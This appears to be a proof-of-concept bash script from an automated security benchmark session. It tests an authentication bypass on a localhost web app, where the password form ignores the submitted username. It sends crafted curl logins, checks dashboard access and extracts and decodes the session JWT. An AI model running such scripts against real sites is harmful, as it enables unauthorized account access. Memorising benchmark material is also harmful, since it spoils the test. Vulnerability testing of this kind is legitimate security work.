#!/bin/bash
# POC: Improved POC that handles various HTTP response codes and verifies authentication bypass where form username is ignored
# Target: ./repo
# Created: 2025-11-04T17:43:50.396Z
# Session: benchmark-XBEN-027-24-mhku5fyk

# Authentication Bypass - Username Confusion in Password Form
# Demonstrates that the form username parameter is completely ignored
# Only the password is validated against the URL parameter user

TARGET_URL="http://localhost:8080"
TEST_USER="test"
TEST_PASSWORD="test"

echo "=== Authentication Bypass: Username Confusion in Password Form ==="
echo ""
echo "Target: $TARGET_URL/password/$TEST_USER"
echo ""

# First, get the password form to understand the submission method
echo "[SETUP] Getting the password form to check form structure..."
FORM_RESPONSE=$(curl -s "$TARGET_URL/password/$TEST_USER")
echo "Form retrieved. Analyzing..."

# Extract form action and method if present
FORM_ACTION=$(echo "$FORM_RESPONSE" | grep -oP 'action="\K[^"]*' | head -1)
FORM_METHOD=$(echo "$FORM_RESPONSE" | grep -oP 'method="\K[^"]*' | head -1)

# If no method found, try to get it differently
if [ -z "$FORM_METHOD" ]; then
    FORM_METHOD=$(echo "$FORM_RESPONSE" | grep -i "method" | head -1)
fi

echo "Form Action: ${FORM_ACTION:-(not found, will use default)}"
echo "Form Method: ${FORM_METHOD:-(defaulting to POST)}"
echo ""

# Test 1: Submit with admin username in form, but correct password for test user
echo "[TEST 1] Submitting form with username=admin, password=test (correct for URL user 'test')"
echo "Testing with various methods..."

# Try POST with form data
RESPONSE1=$(curl -s -c /tmp/cookies1.txt -w "\n%{http_code}" \
  -X POST "$TARGET_URL/password/$TEST_USER" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=$TEST_PASSWORD" 2>&1)

HTTP_CODE1=$(echo "$RESPONSE1" | tail -n1)
BODY1=$(echo "$RESPONSE1" | head -n-1)

echo "HTTP Status: $HTTP_CODE1"
if [ "$HTTP_CODE1" = "302" ]; then
    echo "✓ Redirect response (302) - Authentication likely successful"
    LOCATION=$(echo "$BODY1" | grep -i "location:" | cut -d' ' -f2-)
    echo "  Redirect location: $LOCATION"
elif [ "$HTTP_CODE1" = "200" ]; then
    if echo "$BODY1" | grep -q "dashboard"; then
        echo "✓ Dashboard content returned - Authentication successful"
    elif echo "$BODY1" | grep -iq "error\|incorrect"; then
        echo "✗ Error message received"
    fi
elif [ "$HTTP_CODE1" = "405" ]; then
    echo "405 Method Not Allowed - trying GET request with cookies"
    # Try just GET after POST might have set cookies
    RESPONSE1=$(curl -s -b /tmp/cookies1.txt -w "\n%{http_code}" \
      "$TARGET_URL/password/$TEST_USER")
    HTTP_CODE1=$(echo "$RESPONSE1" | tail -n1)
fi

echo "Status: $HTTP_CODE1"
echo ""

# Test 2: Check if we can access the dashboard with the cookie
echo "[TEST 2] Attempting to access dashboard with authentication from Test 1"
RESPONSE2=$(curl -s -b /tmp/cookies1.txt -w "\n%{http_code}" "$TARGET_URL/dashboard")
HTTP_CODE2=$(echo "$RESPONSE2" | tail -n1)
BODY2=$(echo "$RESPONSE2" | head -n-1)

echo "Dashboard HTTP Status: $HTTP_CODE2"
if [ "$HTTP_CODE2" = "200" ]; then
    echo "✓ Dashboard accessible - Authentication was successful!"
    # Check what username is shown
    if echo "$BODY2" | grep -q "John"; then
        echo "  Dashboard shows user data (contains 'John')"
    fi
    # Try to extract JWT
    if [ -f /tmp/cookies1.txt ]; then
        JWT_TOKEN=$(grep "auth_token" /tmp/cookies1.txt | awk '{print $NF}')
        if [ -n "$JWT_TOKEN" ]; then
            echo "  JWT Token: ${JWT_TOKEN:0:50}..."
            # Try to decode the payload
            PAYLOAD=$(echo "$JWT_TOKEN" | cut -d'.' -f2 2>/dev/null)
            if [ -n "$PAYLOAD" ]; then
                # Add padding if needed
                PAYLOAD_PADDED="$PAYLOAD"
                case $((${#PAYLOAD} % 4)) in
                    2) PAYLOAD_PADDED="${PAYLOAD}==" ;;
                    3) PAYLOAD_PADDED="${PAYLOAD}=" ;;
                esac
                DECODED=$(echo "$PAYLOAD_PADDED" | base64 -d 2>/dev/null || echo "Could not decode")
                echo "  JWT Payload: $DECODED"
                if echo "$DECODED" | grep -q '"username":"test"'; then
                    echo "  ✓ JWT contains username='test' (from URL, not 'admin' from form)"
                fi
            fi
        fi
    fi
else
    echo "✗ Dashboard not accessible or requires authentication"
    echo "  Response code suggests authentication did not work"
fi
echo ""

# Test 3: Try with nonexistent user in form
echo "[TEST 3] Submitting form with username=nonexistent999, password=test"
RESPONSE3=$(curl -s -c /tmp/cookies3.txt -w "\n%{http_code}" \
  -X POST "$TARGET_URL/password/$TEST_USER" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=nonexistent999&password=$TEST_PASSWORD")

HTTP_CODE3=$(echo "$RESPONSE3" | tail -n1)

echo "HTTP Status: $HTTP_CODE3"
if [ "$HTTP_CODE3" = "302" ]; then
    echo "✓ Redirect response - Form username ignored, authenticated as URL user!"
fi

# Try dashboard access
RESPONSE3B=$(curl -s -b /tmp/cookies3.txt -w "\n%{http_code}" "$TARGET_URL/dashboard")
HTTP_CODE3B=$(echo "$RESPONSE3B" | tail -n1)

if [ "$HTTP_CODE3B" = "200" ]; then
    echo "✓ Dashboard accessible with nonexistent form username"
fi
echo ""

# Test 4: Try with wrong password to confirm password is still validated
echo "[TEST 4] Submitting form with correct username but WRONG password"
RESPONSE4=$(curl -s -c /tmp/cookies4.txt -w "\n%{http_code}" \
  -X POST "$TARGET_URL/password/$TEST_USER" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=WRONGPASSWORD123")

HTTP_CODE4=$(echo "$RESPONSE4" | tail -n1)
BODY4=$(echo "$RESPONSE4" | head -n-1)

echo "HTTP Status: $HTTP_CODE4"
if echo "$BODY4" | grep -iq "error\|incorrect\|wrong"; then
    echo "✓ Error message displayed - Password validation still works"
elif [ "$HTTP_CODE4" != "302" ] && [ "$HTTP_CODE4" != "200" ]; then
    echo "✓ Request failed or redirected to error - Password validation active"
fi

# Try dashboard access - should fail
RESPONSE4B=$(curl -s -b /tmp/cookies4.txt -w "\n%{http_code}" "$TARGET_URL/dashboard")
HTTP_CODE4B=$(echo "$RESPONSE4B" | tail -n1)

if [ "$HTTP_CODE4B" != "200" ]; then
    echo "✓ Dashboard not accessible with wrong password - Correct behavior"
fi
echo ""

echo "=== ANALYSIS COMPLETE ==="